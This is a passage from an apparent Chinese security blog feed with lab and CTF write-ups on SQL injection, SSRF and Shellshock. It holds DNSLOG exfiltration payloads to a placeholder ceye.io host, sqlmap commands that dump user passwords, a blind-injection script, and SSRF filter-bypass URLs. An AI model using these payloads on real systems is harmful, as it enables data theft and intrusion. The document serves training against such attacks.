函数</h3><p>上文我们提到，<code>load_file()</code>函数可以读取<strong>任意</strong>盘的文件才可以使用 DNSLOG 注入，它的读取范围由 Mysql 配置文件<code>my.ini</code>中的<code>secure_file_priv</code>参数决定</p><ul><li>当<code>secure_file_priv</code>为空，就可以读取磁盘的目录</li><li>当<code>secure_file_priv</code>为<code>G:\</code>，就可以读取G盘的文件</li><li>当<code>secure_file_priv</code>为 null，<code>load_file()</code>函数就不能加载文件（null 和空是两种情况） ### DNSLOG 盲注原理</li></ul><p>先给出最常用的两种 Payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload <span class="hljs-number">1</span>:<br><span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>((select <span class="hljs-title function_ invoke__">load_file</span>(<span class="hljs-title function_ invoke__">concat</span>(<span class="hljs-string">&#x27;//&#x27;</span>,(select 攻击语句),<span class="hljs-string">&#x27;.xxxx.ceye.io/sql_test&#x27;</span>))),<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)<br><br>Payload <span class="hljs-number">2</span>:<br><span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>((select <span class="hljs-title function_ invoke__">load_file</span>(<span class="hljs-title function_ invoke__">concat</span>(<span class="hljs-string">&#x27;\\\\&#x27;</span>,(select 攻击语句),<span class="hljs-string">&#x27;.xxxx.ceye.io\\sql_test&#x27;</span>))),<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>Payload 1,2 大体的思路都是一样的，也就是在<code>if()</code>函数中嵌套<code>load_file()</code>函数再使用 UNC 路径进行读取，<code>sql_test</code>这里写什么都可以，只是为了符合<code>load_file()</code>函数格式，读取时会产生 DNS 访问信息，唯一的不同点在于 Payload 2 在 URL 中使用<code>\(反斜杠)</code>时要双写配合转义</p><blockquote><p>转义：转义是一种引用单个字符的方法. 一个前面放上转义符 ()的字符就是告诉 shell 这个字符按照字面的意思进行解释</p></blockquote><p>这里使用 Pikachu 靶场的时间盲注关卡进行演示，方便大家进行理解，在测试前一定先要确保<code>secure_file_priv</code>选项为空，可以使用<code>show variables like &#39;%secure%&#39;;</code>进行查询<br><img src="/images/Pasted%20image%2020240718144413.png"></p><p>在修改<code>my.ini</code>文件时需要注意<code>secure_file_priv</code>选项是新增的，本身并没有这个选项<br><img src="/images/Pasted%20image%2020240718144436.png"><br>通过判断可以发现是单引号闭合，先爆出库名，可以通过 DNSLOG 平台看到库名为 pikachu<br><img src="/images/Pasted%20image%2020240718144455.png"><br>这里还可以使用<code>hex()</code>函数，将回显内容编码为十六进制，这样做的好处是，假设回显内容存在特殊字符<code>!@#$%^&amp;</code>，包含特殊字符的域名无法被解析，DNSLOG也就无法记录信息，进行编码后就不存在这个问题<br><img src="/images/Pasted%20image%2020240718144503.png"></p><p>后面整体的思路和联合查询基本一致，只是利用 DNSLOG 创造了回显的条件，这里不再赘述</p><h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p>首先将原始的数据包粘贴到kali里面<br><img src="/images/Pasted%20image%2020240502084935%201.png"><br><img src="/images/Pasted%20image%2020240502084947%201.png"><br><code>sqlmap -r ./http1 -p id -dbs --batch</code><br>使用-p指定参数, -dbs获取所有的数据库 –batch自动选择<br><img src="/images/Pasted%20image%2020240502085619%201.png"><br>或者也可以使用url作为查询的目标<br><code>sqlmap -u &#39;http://47.97.68.252/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2&#39; -p name -dbs --batch</code></p><p>查询现在使用的数据库<br><code>sqlmap -r ./http1 -p id --current-db --batch</code><br><img src="/images/Pasted%20image%2020240502085725%201.png"><br>使用-D指定数据库<br><code>sqlmap -r ./http1 -p id -D pikachu -tables --batch</code><br><img src="/images/Pasted%20image%2020240502085849%201.png"><br>使用-T指定表, 使用–columns查询有那些字段<br><code>sqlmap -r ./http1 -p id -T users --columns --batch</code><br><img src="/images/Pasted%20image%2020240502090128%201.png"><br>使用-C指定字段名, 使用-dump查看记录<br><code>sqlmap -r ./http1 -p id -T users -C username,password -dump --batch</code><br><img src="/images/Pasted%20image%2020240502090507%201.png"></p><h2 id="一些特殊的注入方式"><a href="#一些特殊的注入方式" class="headerlink" title="一些特殊的注入方式"></a>一些特殊的注入方式</h2><h3 id="过滤select"><a href="#过滤select" class="headerlink" title="过滤select"></a>过滤select</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> databases<br><span class="hljs-keyword">show</span> tables#查看所有表<br><span class="hljs-keyword">show</span> columns <span class="hljs-keyword">from</span> employees #查看表的所有列<br></code></pre></td></tr></table></figure><h3 id="baseCTF-only-one-sql"><a href="#baseCTF-only-one-sql" class="headerlink" title="baseCTF-only one sql"></a>baseCTF-only one sql</h3><p>白盒源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);  <br><span class="hljs-variable">$sql</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;sql&#x27;</span>];  <br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/select|;|@|\n/i&#x27;</span>, <span class="hljs-variable">$sql</span>)) &#123;  <br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你知道的，不可能有sql注入&quot;</span>);  <br>&#125;  <br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&quot;|\$|`|\\\\/i&#x27;</span>, <span class="hljs-variable">$sql</span>)) &#123;  <br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你知道的，不可能有RCE&quot;</span>);  <br>&#125;  <br><span class="hljs-comment">//flag in ctf.flag  </span><br><span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;mysql -u root -p123456 -e \&quot;use ctf;select &#x27;没有select，让你执行一句又如何&#x27;;&quot;</span> . <span class="hljs-variable">$sql</span> . <span class="hljs-string">&quot;\&quot;&quot;</span>;  <br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$query</span>);<br></code></pre></td></tr></table></figure><p>先利用show tables和show columns from flag得知了flag表的字段结构<br>然后使用update进行操作</p><p>利用update和REGEXP进行时间盲注，可能会因为网络原因报错，多跑几次就好了<br><code>REGEXP &#39;^Basectf&#39;</code>表示以BaseCTF开头的字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests  <br><span class="hljs-keyword">import</span> time  <br>  <br>url = <span class="hljs-string">&#x27;http://challenge.basectf.fun:47649&#x27;</span>  <br>flag = <span class="hljs-string">&#x27;&#x27;</span>  <br>strings = <span class="hljs-string">&#x27;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ-&#123;&#125;&#x27;</span>  <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>):  <br>        <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> strings:  <br>            payload=<span class="hljs-string">&quot;UPDATE flag SET id = &#x27;fffffilm&#x27; WHERE data REGEXP &#x27;^Basectf&#x27; AND IF(data REGEXP &#x27;^&#123;&#125;&#x27;,sleep(1), 1)&quot;</span>.<span class="hljs-built_in">format</span>((flag+char))  <br>            params=&#123;  <br>                <span class="hljs-string">&quot;sql&quot;</span>:payload  <br>            &#125;  <br>            <span class="hljs-built_in">print</span>(payload)  <br>            time.sleep(<span class="hljs-number">0.05</span>)  <br>            start_time = time.time()  <br>            rs = requests.get(url,params=params)  <br>            end_time = time.time()  <br>            <span class="hljs-keyword">if</span> end_time - start_time &gt; <span class="hljs-number">1</span>:  <br>                flag += char  <br>                <span class="hljs-built_in">print</span>(flag)  <br>                <span class="hljs-keyword">break</span>  <br>            <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(flag)&gt;<span class="hljs-number">44</span>:  <br>                <span class="hljs-built_in">print</span>(flag[:<span class="hljs-number">1</span>]+flag[<span class="hljs-number">1</span>:<span class="hljs-number">4</span>].lower()+flag[<span class="hljs-number">4</span>:<span class="hljs-number">7</span>]+flag[<span class="hljs-number">7</span>:].lower())  <br>                exit()<br></code></pre></td></tr></table></figure><h3 id="2019强网杯-随便注"><a href="#2019强网杯-随便注" class="headerlink" title="2019强网杯-随便注"></a>2019强网杯-随便注</h3><p>先查询所有数据库<br><code>&#39;;show databases;   查询所有的表 </code>‘;show tables;<code> ![](/images/d4f80785bdae228520a7a3ebc0a25bfc.png)   这里面有一个</code>1919810931114514&#96;表</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">&#x27;;<span class="hljs-built_in">show</span> <span class="hljs-built_in">columns</span> from `<span class="hljs-number">1919810931114514</span>`;<br></code></pre></td></tr></table></figure><p><img src="/images/0ae332daaa86cffddc2ebe0ec3b8572b.png"><br>看到了flag字段</p><p>我们正常的思路是这样</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">&#x27;;<span class="hljs-keyword">select</span> flag <span class="hljs-keyword">from</span> <span class="hljs-symbol">`1919810931114514`</span>;  <br></code></pre></td></tr></table></figure><p>但是可以看到它过滤了select<br>考虑到它这里可以堆叠注入, 所以可以先将这一段sql语句转为16进制的变量, 然后执行这个变量</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;;SeT @a=0x73656c65637420666c61672066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;  </span><br></code></pre></td></tr></table></figure><p>0x73656c65637420666c61672066726f6d20603139313938313039333131313435313460就是</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> flag <span class="hljs-keyword">from</span> <span class="hljs-symbol">`1919810931114514`</span>;<br></code></pre></td></tr></table></figure><p>的16进制</p><p><img src="/images/655bd802c4defd02b56d87ececca717c.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/09/23/%E6%BC%8F%E6%B4%9E-SSRF/"/>
    <url>/2024/09/23/%E6%BC%8F%E6%B4%9E-SSRF/</url>
    
    <content type="html"><![CDATA[<p>Server-side request forgery is a web security vulnerability that allows an attacker to cause the server-side application to make requests to an unintended location.<br>就是伪造成服务端</p><h3 id="Basic-SSRF-against-the-local-server"><a href="#Basic-SSRF-against-the-local-server" class="headerlink" title="Basic SSRF against the local server"></a><a href="https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost">Basic SSRF against the local server</a></h3><p><img src="/images/Pasted%20image%2020240514153559.png"><br>这里有一个check stock检查库存的功能<br>数据包是这样的<br><img src="/images/Pasted%20image%2020240514153633.png"><br>通过url解码可以看到<code>stockApi</code>是<img src="/images/Pasted%20image%2020240514153653.png"></p><p>为什么会有这个stockApi呢?</p><blockquote><p>例如，假设有一个购物应用程序，它允许用户查看某个商店中某件商品是否有货。为了提供库存信息，该应用程序必须查询各种后端 REST API。它通过前端 HTTP 请求将 URL 传递到相关的后端 API 端点来实现这一点。当用户查看某件商品的库存状态时，他们的浏览器会发出以下请求：</p></blockquote><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /product/stock HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">0</span> <br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded <br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">118</span> <br><span class="hljs-attribute">stockApi</span>=http://stock.weliketoshop.net:<span class="hljs-number">8080</span>/product/stock/check%<span class="hljs-number">3</span>FproductId%<span class="hljs-number">3</span>D6%<span class="hljs-number">26</span>storeId%<span class="hljs-number">3</span>D1<br></code></pre></td></tr></table></figure><blockquote><p>这会导致服务端向特定的url发送一个请求取回库存的状态, 再返回给用户</p></blockquote><p>靶场的介绍中说这个网站有一个<a href="http://localhost/admin%E7%95%8C%E9%9D%A2">http://localhost/admin界面</a>, 但是你直接通过url访问是不能进去的, 因为你现在不在内网环境里面也没有登录管理员账号<br><img src="/images/Pasted%20image%2020240514153910.png"></p><p>这时候就可以利用刚才那个<code>stockApi</code><br>由于这个stockApi由服务端去访问的, 在内网环境里面, 请求来自本地, 那么我们就可以访问到页面了</p><p>所以在这里更改刚才的数据包再发送出去<br><img src="/images/Pasted%20image%2020240514154305.png"><br>就看到了admin页面, 这个页面的内容是服务端拉取再返回给用户的</p><p>靶场要求删除这名叫carlos的用户</p><p>那么我们找到删除用户的API<br><img src="/images/Pasted%20image%2020240514154502.png"><br>还是用<code>stockApi</code>发送这个url <code>http://localhost/admin/delete?username=carlos</code><br><img src="/images/Pasted%20image%2020240514155052.png"><br>返回了一个302重定向界面</p><p>然后再回到&#x2F;admin界面, 就完成了靶场<br><img src="/images/Pasted%20image%2020240514155134.png"></p><p>整个过程下来就是在利用stockApi这个参数来代替我们自己去访问网站</p><h3 id="Basic-SSRF-against-another-back-end-system"><a href="#Basic-SSRF-against-another-back-end-system" class="headerlink" title="Basic SSRF against another back-end system"></a><a href="https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system">Basic SSRF against another back-end system</a></h3><p>还是找到这个查看库存的数据包<br><img src="/images/Pasted%20image%2020240514155703.png"><br>url解码得到<br><img src="/images/Pasted%20image%2020240514155751.png"><br><code>stockApi=http://192.168.0.1:8080/product/stock/check?productId=1&amp;storeId=1</code><br>题目要我们扫描内网<code>192.168.0.X:8080</code>的范围来找到admin的界面, 再利用admin删除carlos</p><p>将这个数据包发送到Intruder爆破模块<br><img src="/images/Pasted%20image%2020240514160117.png"><br>在1这个位置添加一个标记<br><img src="/images/Pasted%20image%2020240514160337.png"><br>然后转到payload这里这样设置<br><img src="/images/Pasted%20image%2020240514160455.png"><br>然后开始攻击, 等待它跑完</p><p>通过筛选返回的状态码, 可以看到</p><blockquote><p>192.168.0.177:8080返回的是404,<br>192.168.0.1:8080返回的是400,<br>而其他的都是500<br><img src="/images/Pasted%20image%2020240514160718.png"></p></blockquote><p>于是猜测这个地址是admin的地址, 发包<br><img src="/images/Pasted%20image%2020240514160913.png"><br>可以看到验证了猜想</p><p>然后是上一个的操作</p><h3 id="Blind-SSRF-with-out-of-band-detection"><a href="#Blind-SSRF-with-out-of-band-detection" class="headerlink" title="Blind SSRF with out-of-band detection"></a><a href="https://portswigger.net/web-security/ssrf/blind">Blind SSRF</a> with out-of-band detection</h3><p>使用DNS外带<br>打开靶场随便选择一个商品<br><img src="/images/Pasted%20image%2020240515002124.png"><br>发送到repeater<br><img src="/images/Pasted%20image%2020240515002318.png"><br>将这个Referer头插入payload, 然后发送, 这时候Referer就变成了我们burpsuite自己的DNS域名(记得在前面加上http:&#x2F;&#x2F;)<br><img src="/images/Pasted%20image%2020240515002559.png"><br>然后在burp的Collaborator模块里手动刷新(Poll now)<br><img src="/images/Pasted%20image%2020240515002657.png"><br>就看到了这些记录</p><h3 id="SSRF-with-blacklist-based-input-filter-bypass"><a href="#SSRF-with-blacklist-based-input-filter-bypass" class="headerlink" title="SSRF with blacklist-based input filter(bypass)"></a><a href="https://portswigger.net/web-security/ssrf">SSRF</a> with blacklist-based input filter(bypass)</h3><blockquote><p>Some applications block input containing hostnames like <code>127.0.0.1</code> and <code>localhost</code>, or sensitive URLs like <code>/admin</code>. In this situation, you can often circumvent(规避) the filter using the following techniques:</p></blockquote><ul><li>Use an alternative IP representation of <code>127.0.0.1</code>, such as <code>2130706433</code>, <code>017700000001</code>, or <code>127.1</code>.</li><li>Register your own domain name that resolves to <code>127.0.0.1</code>. You can use <code>spoofed.burpcollaborator.net</code> for this purpose.</li><li>Obfuscate(混淆) blocked strings using URL encoding or case variation.</li><li>Provide a URL that you control, which redirects to the target URL. Try using different redirect codes, as well as different protocols(协议) for the target URL. For example, switching from an <code>http:</code> to <code>https:</code> URL during the redirect has been shown to bypass some anti-SSRF filters.</li></ul><p>还是刚才那个检查库存的api<br><img src="/images/Pasted%20image%2020240518134312.png"><br>但是这时候直接发送localhost&#x2F;admin会发现被过滤了<br><img src="/images/Pasted%20image%2020240518134435.png"><br>换成127.0.0.1&#x2F;admin发现也是不行的<br><img src="/images/Pasted%20image%2020240518134500.png"><br>去掉admin, 也不行<br><img src="/images/Pasted%20image%2020240518134653.png"><br>将127.0.0.1换成127.1,  返回了常规网站界面<br><img src="/images/Pasted%20image%2020240518134713.png"><br>再加上&#x2F;admin  发现依然不行<br><img src="/images/Pasted%20image%2020240518134746.png"></p><p>说明<code>admin</code>也被ban了<br>将<code>admin</code>进行url编码, 发现还是失败<br><img src="/images/Pasted%20image%2020240518134932.png"></p><p>说明它可能在发送过去的时候后端就自动解码了, 这里我们可以将<code>admin</code>进行两次url编码<br><img src="/images/Pasted%20image%2020240518135501.png"><br><img src="/images/Pasted%20image%2020240518135438.png"><br>发送删除用户的api<br><img src="/images/Pasted%20image%2020240518135640.png"><br>发现成功删除用户</p><h3 id="SSRF-with-filter-bypass-via-open-redirection-vulnerability"><a href="#SSRF-with-filter-bypass-via-open-redirection-vulnerability" class="headerlink" title="SSRF with filter bypass via open redirection vulnerability"></a><a href="https://portswigger.net/web-security/ssrf">SSRF</a> with filter bypass via open redirection vulnerability</h3><p><img src="/images/Pasted%20image%2020240528175440.png"><br>靶场说这个192.168.0.12:8080是管理界面<br>但是这个stockApi被限制只能访问本地的应用</p><p>还是找到这个库存api<br><img src="/images/Pasted%20image%2020240528175418.png"><br>将地址替换为<code>http://192.168.0.12:8080/admin</code><br><img src="/images/Pasted%20image%2020240528175721.png"><br>提示说无效, 所以我们要找到一个可以用于重定向的地方</p><p>随便点击网站的一些别的按钮, 比如在这个<code>Next product</code><br><img src="/images/Pasted%20image%2020240530204159.png"></p><p><img src="/images/Pasted%20image%2020240528175905.png"><br>这里浏览器使用GET请求向<code>/product/nextProduct</code>界面发送了一个<code>currentProductId=1</code>参数和一个<code>path=/product?productId=2</code>参数<br>服务器返回了302重定向, 其中<code>Location</code>头代表了重定向的位置<br>可以看到, path参数指定了Location头的值, 也就是接下来要访问的地址</p><blockquote><p>服务端响应<code>3**</code>状态码时，服务端会告诉浏览器要跳转到哪个网址，此时就需要用到响应Header的Location属性<br>当浏览器响应的状态码为<code>3**</code>时，我们就需要用到<code>Location</code>这个属性，这个属性会告诉浏览器接下来要访问哪条资源路径</p></blockquote><p>这就是一种叫<code>open redirection</code>漏洞, 我们可以通过控制类似<code>path</code>这样的参数控制浏览器下一步重定向到哪里<br>因此我们可以利用这个漏洞让服务器成功访问到admin界面并返回给我们</p><p>这其中的过程大致如下(为了方便区分我使用服务端的某某地址来称呼, 其实都是一台机器):</p><ul><li>如果利用刚才那个地方的<code>stockApi</code>向服务端的这个地址<code>/product/stock</code>发送这一串字符串<code>/product/nextProduct?currentProductId=1&amp;path=/product?productId=2</code></li><li>那么服务端的就会访问<code>/product/nextProduct</code>这个地址(就是本地)并且发送两个这样的参数<code>currentProductId=1&amp;path=/product?productId=2</code></li><li><code>/product/nextProduct</code>这里个地方接收到之后, 就会让对方, 也就是服务器自己, 重定向到<code>/product?productId=2</code>这个地址<br><img src="/images/Pasted%20image%2020240530211923.png"><br><strong>注意, 实际上使用<code>stockApi</code>的时候记得把参数都进行一次url编码</strong><br>可以看到, 返回了下一件商品的页面</li><li>现在我们只需要把<code>path</code>参数替换为<code>http://192.168.0.12:8080/admin</code>就可以访问到管理界面</li></ul><h2 id="SSRF-with-whitelist-based-input-filters"><a href="#SSRF-with-whitelist-based-input-filters" class="headerlink" title="SSRF with whitelist-based input filters"></a>SSRF with whitelist-based input filters</h2><blockquote><p>有些应用程序只允许匹配的输入，即允许值的白名单。筛选器可能会在输入的开头或其中包含的内容中查找匹配项。可以利用URL解析中的不一致性绕过此筛选器。<br>&#x3D;&#x3D;Some applications only allow inputs that match, a whitelist of permitted values. The filter may look for a match at the beginning of the input, or contained within in it. You may be able to bypass this filter by exploiting inconsistencies in URL parsing.&#x3D;&#x3D;</p></blockquote><blockquote><p>URL规范包含许多特性，当URL使用此方法实现特别解析和验证时，这些特性可能会被忽略:<br>&#x3D;&#x3D;The URL specification contains a number of features that are likely to be overlooked when URLs implement ad-hoc parsing and validation using this method: &#x3D;&#x3D;</p></blockquote><ul><li><p>你可以在主机名前面使用<code>@</code>嵌入证书&#x3D;&#x3D;You can embed credentials in a URL before the hostname, using the <code>@</code> character&#x3D;&#x3D;.<br>  For example:<code>https://expected-host:fakepassword@evil-host</code><br>  没找到资料, 我估计前面的是一种类似于登录的</p></li><li><p>使用<code>#</code>来指示URL的分段&#x3D;&#x3D;You can use the <code>#</code> character to indicate a URL fragment. For example:&#x3D;&#x3D;<br>  <code>https://evil-host#expected-host</code><br>  <a href="obsidian://open?vault=xiaod.web&file=%E5%85%B3%E4%BA%8Eurl%E4%B8%AD%EF%BC%83%E7%9A%84%E4%BD%9C%E7%94%A8">关于url中<code>#</code>的作用</a>  </p></li><li><p>可以利用 DNS 命名层次结构来放置你控制的充分认证后的DNS名。&#x3D;&#x3D;You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example:&#x3D;&#x3D;<br>  <code>https://expected-host.evil-host</code></p></li><li><p>您可以对字符进行 URL 编码，以混淆 URL 解析代码。如果实现过滤器的代码处理 URL 编码字符的方式与执行后端 HTTP 请求的代码不同，则此功能特别有用。您还可以尝试对字符进行双重编码；某些服务器会递归对输入进行 URL 解码, 从而导致进一步的差异&#x3D;&#x3D;You can URL-encode characters to confuse the URL-parsing code. This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request. You can also try <a href="https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings#obfuscation-via-double-url-encoding">double-encoding</a> characters; some servers recursively URL-decode the input they receive, which can lead to further discrepancies.&#x3D;&#x3D;</p></li><li><p>You can use combinations of these techniques together.</p></li></ul><p>还是这个靶场, 管理页面是这个<code>http://localhost/admin</code><br>检查库存<br><img src="/images/Pasted%20image%2020240629182021.png"><br><img src="/images/Pasted%20image%2020240630022411.png"></p><p><code>stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&amp;storeId=1</code><br>这个靶场是有白名单的, 所以类似于<code>http://localhost/admin</code>这种是不允许访问的<br>检查器必须要检查是<code>stock.weliketoshop.net</code>这个域名才会放行<br>用@这种方式, 假装是以用户名进行访问<br><code>stockApi=http://username@stock.weliketoshop.net</code></p><p>但是这还不能访问到我们想要访问的admin<br>所以我们改为<code>http://localhost#@stock.weliketoshop.net</code><br>然后再对<code>#</code>进行两次url编码即<code>%2523</code><br>得到<br><code>http://localhost%2523@stock.weliketoshop.net</code><br>然后发送, 就会发现可以被接收<br><img src="/images/Pasted%20image%2020240630025501.png"><br>为什么这个可以被接收呢?<br>首先我们输入的是<code>http://localhost%2523@stock.weliketoshop.net</code><br>进行一次解码之后, 那个检查域名的程序看到的就是<code>http://localhost%23@stock.weliketoshop.net</code>它会以为@前面的是用户名, 它看到右边的确实是正确的域名之后就放行了<br>最后被目标服务器接收到的时候又经过了一次url解码, 目标服务器看到的是<code>http://localhost#@stock.weliketoshop.net</code>, 它认为#后面的是对于http消息传递中没用的信息(具体看<code>#</code>的作用)于是最后访问的是localhost</p><p>如果要访问admin的话, payload就需要是<br><code>http://localhost%2523@stock.weliketoshop.net/admin</code><br>成功访问<br><img src="/images/Pasted%20image%2020240630030110.png"><br>删除用户<br><img src="/images/Pasted%20image%2020240630030150.png"></p><h2 id="Blind-SSRF-with-Shellshock-exploitation"><a href="#Blind-SSRF-with-Shellshock-exploitation" class="headerlink" title="Blind SSRF with Shellshock exploitation"></a><a href="https://portswigger.net/web-security/ssrf/blind">Blind SSRF</a> with Shellshock exploitation</h2><p>这是涉及到一个Linux破壳漏洞<br><a href="https://www.cnblogs.com/Cl0ud/p/14248937.html"># Bash 破壳漏洞Shellshock （CVE-2014-6271）复现分析</a><br><a href="https://zgao.top/bash%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9Ecve-2014-6271%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/">https://zgao.top/bash%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9Ecve-2014-6271%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/</a></p><p>GNU Bash 4.3及之前版本在评估某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行Shell命令。某些服务和应用允许未经身份验证的远程攻击者提供环境变量以利用此漏洞。此漏洞源于在调用Bash Shell之前可以用构造的值创建环境变量。这些变量可以包含代码，在Shell被调用后会被立即执行。</p><p>这个漏洞的英文是：<strong>ShellShock</strong>，中文名被XCERT命名为：破壳漏洞。</p><p>该漏洞在Red Hat、CentOS、Ubuntu 、Fedora 、Amazon Linux 、OS X 10.10中均拥有存在CVE-2014-6271（即“破壳”漏洞）漏洞的Bash版本，同时由于Bash在各主流操作系统的广泛应用，此漏洞的影响范围包括但不限于大多数应用Bash的Unix、Linux、Mac OS X，而针对这些操作系统管理下的数据均存在高危威胁。</p><p>漏洞的利用方式会通过与Bash交互的多种应用展开，包括HTTP、OpenSSH、DHCP等</p><h3 id="本地漏洞检测"><a href="#本地漏洞检测" class="headerlink" title="本地漏洞检测"></a>本地漏洞检测</h3><p>搭建一个vulhub靶场, <code>docker-compose up -d</code></p><p>具体搭建过程<a href="https://www.cnblogs.com/Cl0ud/p/14248937.html"># Bash 破壳漏洞Shellshock （CVE-2014-6271）复现分析</a></p><p><a href="https://springbird.oss-cn-beijing.aliyuncs.com/blog20210105111432.png"><img src="https://springbird.oss-cn-beijing.aliyuncs.com/blog20210105111432.png"></a></p><p>进入<code>docker</code>容器</p><p><code>payload</code>为： <code>env x=&#39;() &#123; :;&#125;; echo shellshocked&#39; bash –c &quot;echo hi&quot;</code></p><p><a href="https://springbird.oss-cn-beijing.aliyuncs.com/blog20210105112350.png"><img src="https://springbird.oss-cn-beijing.aliyuncs.com/blog20210105112350.png"></a></p><p>命令解释如下(&#x3D;&#x3D;这部分看不懂没关系, 看完下面的漏洞原理再回来&#x3D;&#x3D;)：</p><p><code>env x=&#39;() &#123; :;&#125;; echo shellshocked&#39; bash -c &quot;echo hi&quot;</code></p><ul><li><code>env</code>: 这个命令用来设置环境变量。</li><li><code>x=&#39;() &#123; :;&#125;; echo shellshocked&#39;</code>: 这里设置了一个名为<code>x</code>的环境变量，其值为一个函数定义，该函数什么也不做（<code>:</code>是空操作，<code>;</code>是分隔符），然后输出<code>shellshocked</code>。</li><li><code>bash -c &quot;echo hi&quot;</code>: 这是启动一个新的bash会话，并执行<code>-c</code>选项后面的命令，即<code>echo hi</code>。</li></ul><p>漏洞利用的关键点在于，当<code>bash -c</code>启动一个新的bash会话时，它会从环境变量中读取函数定义。由于<code>x</code>变量被设置为一个函数定义，bash会话会读取这个定义并执行它。这就是为什么你会看到<code>shellshocked</code>被输出的原因。</p><p>这个命令执行后，首先输出<code>shellshocked</code>，然后是<code>echo hi</code>命令的结果，即<code>hi</code>。</p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>口语化阐释一下漏洞原理：<code>父进程中的特殊变量字符串(这里指字符串内容为函数)成为环境变量后，在子进程中调用该字符串时将其理解为函数执行</code></p><p>在<code>shell</code>中函数定义：<a href="https://www.runoob.com/linux/linux-shell-func.html">https://www.runoob.com/linux/linux-shell-func.html</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-comment"># author:菜鸟教程</span><br><span class="hljs-comment"># url:www.runoob.com</span><br><br><span class="hljs-function"><span class="hljs-title">demoFun</span></span>()&#123;<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;这是我的第一个 shell 